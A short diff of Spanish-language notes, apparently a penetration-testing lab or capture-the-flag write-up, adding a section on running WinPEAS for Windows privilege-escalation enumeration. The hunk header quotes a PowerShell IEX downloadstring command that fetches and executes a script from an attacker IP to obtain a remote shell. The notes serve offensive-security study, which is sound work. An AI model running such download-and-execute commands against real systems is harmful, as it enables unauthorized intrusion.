@@ -324,3 +324,6 @@ powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.73:9006
 con un servidor compartimos el archivo para posteriormente llamarlo y obtener una conexión
 ![[Pasted image 20240724155109.png]]
 
+### WinPEAS.exe
+despues de enumerar un buen rato el sistema no hemos encontrado un vector de ataque asi que vamos a usar la herramienta `winpeas` para intentar 
+![[Pasted image 20240724160615.png]]
